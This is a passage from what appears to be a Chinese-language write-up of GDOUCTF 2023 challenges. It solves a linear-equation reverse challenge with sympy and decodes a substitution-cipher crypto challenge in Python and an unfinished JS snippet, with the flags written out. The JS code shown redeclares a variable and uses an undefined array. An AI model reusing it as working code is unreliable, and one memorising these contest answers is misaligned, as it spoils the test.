<span class="number">55</span> + z * <span class="number">90</span> == <span class="number">333322</span>) &amp;&amp;</span><br><span class="line">		(v * <span class="number">123</span> + w * <span class="number">-322</span> + x * <span class="number">68</span> + y * <span class="number">67</span> + z * <span class="number">32</span> == <span class="number">707724</span>) &amp;&amp;</span><br><span class="line">		(v * <span class="number">266</span> + w * <span class="number">-34</span> + x * <span class="number">43</span> + y * <span class="number">8</span> + z * <span class="number">32</span> == <span class="number">1272529</span>) &amp;&amp;</span><br><span class="line">		(v * <span class="number">343</span> + w * <span class="number">-352</span> + x * <span class="number">58</span> + y * <span class="number">65</span> + z * <span class="number">5</span> == <span class="number">1672457</span>) &amp;&amp;</span><br><span class="line">		(v * <span class="number">231</span> + w * <span class="number">-321</span> + x * <span class="number">938</span> + y * <span class="number">555</span> + z * <span class="number">970</span> == <span class="number">3372367</span>))&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Congratulations, Here is your flag:\n&quot;</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;flag&#123;&quot;</span> &lt;&lt; v &lt;&lt; <span class="string">&quot;_&quot;</span> &lt;&lt; w &lt;&lt; <span class="string">&quot;_&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;_&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;_&quot;</span> &lt;&lt; z &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSeems your luck is not in favor right now!\nBetter luck next time!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要解方程即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">v=sympy.Symbol(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">w=sympy.Symbol(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x=sympy.Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=sympy.Symbol(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z=sympy.Symbol(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">f1=v * <span class="number">23</span> + w * -<span class="number">32</span> + x * <span class="number">98</span> + y * <span class="number">55</span> + z * <span class="number">90</span> - <span class="number">333322</span></span><br><span class="line">f2=v * <span class="number">123</span> + w * -<span class="number">322</span> + x * <span class="number">68</span> + y * <span class="number">67</span> + z * <span class="number">32</span> -<span class="number">707724</span></span><br><span class="line">f3=v * <span class="number">266</span> + w * -<span class="number">34</span> + x * <span class="number">43</span> + y * <span class="number">8</span> + z * <span class="number">32</span> - <span class="number">1272529</span></span><br><span class="line">f4=v * <span class="number">343</span> + w * -<span class="number">352</span> + x * <span class="number">58</span> + y * <span class="number">65</span> + z * <span class="number">5</span>- <span class="number">1672457</span></span><br><span class="line">f5=v * <span class="number">231</span> + w * -<span class="number">321</span> + x * <span class="number">938</span> + y * <span class="number">555</span> + z * <span class="number">970</span>-<span class="number">3372367</span></span><br><span class="line">r=sympy.solve([f1,f2,f3,f4,f5],[v,w,x,y,z])</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;v: 4544, w: 123, x: 677, y: 1754, z: 777&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416220846361.png" alt="image-20230416220846361"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4544_123_677_1754_777&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><p>简单的替换加密，逆着回去就可以了。</p>
<p>python方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#x27;</span></span><br><span class="line">encryptedString=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">match</span> c[i]:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;d&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;e&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;f&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;g&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;h&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;i&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            encryptedString +=<span class="string">&#x27;j&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;k&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;l&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;m&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;n&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;o&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;p&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;q&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;r&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            encryptedString +=<span class="string">&#x27;t&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;u&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;v&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;w&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;^&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;y&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;z&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;4&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;5&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;6&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;8&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;9&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;!&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;:&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;@&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            encryptedString +=<span class="string">&#x27;#&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;$&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;`&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;%&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;^&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;*&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;(&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;_&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;+&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;`&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;~&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&quot;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;[&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;]&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;|&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;:&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;|&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;\&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;?&#x27;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            encryptedString += <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encryptedString)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;c0rrectly_decrypted_the_$ecret_flag_encrypted_with_5up3r_easy_b@by_encryp7ion_alg0r!thm_written_in_vanil1a_js&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>JS方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> encryptedString = <span class="string">&#x27;+&#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#x27;</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line"><span class="keyword">let</span> encryptedString = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> hasInvalidCharacter = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; charArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (charArray[i]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span 